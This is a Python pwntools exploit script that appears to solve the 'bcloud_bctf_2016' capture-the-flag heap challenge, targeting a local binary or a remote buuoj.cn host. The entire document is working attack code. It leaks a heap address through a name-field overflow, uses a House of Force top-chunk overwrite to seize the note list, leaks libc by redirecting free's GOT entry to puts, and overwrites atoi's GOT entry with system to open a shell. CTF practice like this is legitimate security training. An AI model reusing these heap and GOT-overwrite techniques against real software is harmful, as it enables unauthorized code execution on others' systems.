#! /usr/bin/python

import sys
from pwn import *
from LibcSearcher import *

context.log_level = 'debug'

if(sys.argv[1]=='l'):
	p = process('./bcloud_bctf_2016')
	elf = ELF('./bcloud_bctf_2016')
else:
	p = remote('node3.buuoj.cn',26178)
	elf = ELF('./bcloud_bctf_2016')

sl = lambda x:p.sendline(x)
sd = lambda x:p.send(x)
ru = lambda x:p.recvuntil(x)
rv = lambda x:p.recv(x)
ia = lambda :p.interactive()
g = lambda :gdb.attach(p)

def menu(choice):
	ru("--->>\n")
	sl(str(choice))

def add(size,content):
	menu(1)
	ru("note content:\n")
	sl(str(size))
	ru("content:\n")
	sl(content)

def edit(idx,content):
	menu(3)
	ru("id:\n")
	sl(str(idx))
	ru("new content:\n")
	sl(content)

def delete(idx):
	menu(4)
	ru("id:\n")
	sl(str(idx))


###leak heap&&HOF###
ru('Input your name:\n')
sd('A'*0x38 + 'B'*0x8)
ru('B'*0x8)
heap = u32(rv(4))
heap_base = heap - 0x8
top_chunk = heap_base + (0x40+0x8) * 3
success("heap:"+hex(heap_base))
success("top chunk:"+hex(top_chunk))

ru("Org:\n")
sd('B'*64)
ru("Host:\n")
sl(p32(0xffffffff))
#g()

###HOF###
free_got = elf.got['free']
atoi_got = elf.got['atoi']
puts_plt = elf.symbols['puts']
list_chunk = 0x0804B120
size_chunk = 0x0804B0A0

fake_chunk_offset = (size_chunk - 0x8) - top_chunk - 0x8
payload = p32(16) + p32(16) + p32(16)#three chunk size
payload = payload.ljust((list_chunk - size_chunk),'\x00')#before list_chunk
payload+= p32(free_got) + p32(atoi_got) + p32(atoi_got)

add(fake_chunk_offset,'aaaa')
add(len(payload),payload)
#g()

###leak libc###
edit(0,p32(puts_plt))
delete(1)
atoi = u32(rv(4))

libc = LibcSearcher('atoi',atoi)
libc_base = atoi - libc.dump('atoi')
system = libc_base + libc.dump('system')

edit(2,p32(system))

###get shell###
sl('/bin/sh\x00')
ia()
